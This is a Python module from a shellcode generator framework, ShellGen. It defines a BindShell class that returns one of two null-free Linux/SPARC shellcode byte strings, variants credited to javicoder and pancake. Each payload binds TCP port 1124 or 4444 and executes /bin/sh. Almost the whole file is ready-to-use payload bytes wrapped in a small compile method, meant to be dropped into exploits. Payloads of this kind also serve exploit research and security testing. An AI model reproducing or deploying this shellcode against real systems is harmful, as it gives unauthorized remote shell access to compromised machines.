#!/usr/bin/env python

###############################################################################
## Bind to TCP port 1124 and execute /bin/sh in Linux/Sparc                  ##
## Shellcode for ShellGen                                                    ##
## Based on original code by javicoder from 48bits                           ##
## http://www.48bits.com/papers/sparc_shellcodes.txt                         ##
###############################################################################

# Copyright (c) 2012-2015 Mario Vilas, javicoder, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Bind to a TCP port and execute /bin/sh."

__all__ = ["BindShell"]

from shellgen import Dynamic

class BindShell (Dynamic):
    """
    "Bind to TCP port 1124 or 4444 and execute /bin/sh in Linux/Sparc.

    Based on original code by javicoder and pancake from 48bits:
     - `<http://www.48bits.com/papers/sparc_shellcodes.txt>`_
     - `<http://radare.org/y/>`_
    """

    qualities = "payload"
    encoding  = "nullfree"

    address = "0.0.0.0"

    variants = {

        # javicoder variant
        1124: (
            "\x9f\xe5\xc1\x82\xa2\x12\x22\x04\xa4\x12\x22\x03\xe2\x25\xa2\x46\xe4\x25"
            "\xa2\x4a\xc2\x25\xa2\x4e\x92\x12\x22\x03\x94\x05\xa2\x46\x84\x12\x22\xd0"
            "\x93\xd2\x22\x12\xd2\x29\xc1\xfe\xe2\x39\xc1\xea\x92\x12\x26\x66\xd2\x39"
            "\xc1\xec\xc2\x29\xc1\xee\xd2\x09\xc1\xfe\xa4\x09\xc1\xea\x96\x12\x22\x12"
            "\xd2\x25\xa2\x46\xe4\x25\xa2\x4a\xd6\x25\xa2\x4e\x92\x12\x22\x04\x93\xd2"
            "\x22\x12\xa4\x12\x22\x03\x92\x12\x22\x06\x93\xd2\x22\x12\x96\x09\xc1\xfe"
            "\xd6\x25\xa2\x4e\x92\x12\x22\x07\x93\xd2\x22\x12\x94\x12\x22\x05\xd2\x29"
            "\xc1\xfa\x94\x24\x62\x03\x84\x12\x22\x5c\x93\xd2\x22\x12\x82\xa4\x62\x03"
            "\x18\xc1\x01\xfe\xd2\x09\xc1\xfa\x92\x1c\x42\x0b\x84\x12\x22\x80\x93\xd2"
            "\x22\x12\x23\x0d\xda\x9c\xa2\x16\x23\x70\x25\x0d\xde\xdc\x92\x0d\x82\x10"
            "\x84\x12\x22\x0d\x93\xd2\x22\x12"
        ),

        # pancake variant
        4444: (
            "\x23\x2d\x57\xbb\xa2\x14\x63\xd5\x20\xbf\xff\xff\x20\xbf\xff\xff"
            "\x7f\xff\xff\xff\xea\x03\xe0\x20\xaa\x9d\x40\x11\xea\x23\xe0\x20"
            "\xa2\x04\x40\x15\x81\xdb\xe0\x20\x12\xbf\xff\xfb\x9e\x03\xe0\x04"
            "\x29\x75\x4f\xd2\xf1\x9a\xaf\xde\x61\x8a\x8f\xdf\x61\x89\x70\x2b"
            "\xb1\xed\x30\x2b\xf1\xd1\xf0\x37\x60\x35\xaf\xcb\x06\x29\x8f\x1d"
            "\x97\x99\xf0\xb1\x3c\x3a\x50\x91\x9a\x2d\xb0\xc1\x32\x6e\x0f\x15"
            "\x54\x4a\xcf\x2d\xb1\xad\x30\x49\x69\xb8\x10\x0d\xc3\xdf\x12\xb8"
            "\xfb\xe4\x2d\x22\x6c\x0b\x72\xa0\x1d\xfb\x52\xb4\xbf\xeb\xb2\xb5"
            "\x22\x28\x0d\x4d\x32\x3f\x52\xa9\xa3\xef\xb2\xa1\x04\x2c\x0d\x39"
            "\x44\x10\xcd\x45\xd4\x47\x12\xb0\x45\xb7\x72\xaa\xb6\x14\xcd\x3e"
            "\xa4\x4b\x12\xbd\x5a\xc9\x32\xc0\xd9\x1d\x92\x98\x4c\xcd\xf3\x0c"
            "\x7c\x52\x0c\xd1\x51\xae\x4c\xdd\xc5\xab\x73\x16\xc4\xc7\xab\xb2"
            "\xa6\xcc\x6a\xac\x85\xe7\xb1\xea\x59\xdb\xea\x1a\xc8\x38\x4a\x12"
            "\x0c\x04\x35\xd2\x1c\x58\xf5\xea\x5c\xbc\xb5\xf6\xde\xd2\xea\x3d"
            "\x4f\x02\xca\x49\x70\xa3\x0a\x49"
        ),
    }

    def __init__(self, port = 4444):
        self.port = port
        if port not in self.variants:
            raise ValueError(
                "The only supported port numbers are: " +
                ", ".join(str(x) for x in sorted(self.variants)))

    def compile(self, *argv, **argd):
        port = self.port
        if port not in self.variants:
            raise ValueError(
                "The only supported port numbers are: " +
                ", ".join(str(x) for x in sorted(self.variants)))
        return self.variants[port]
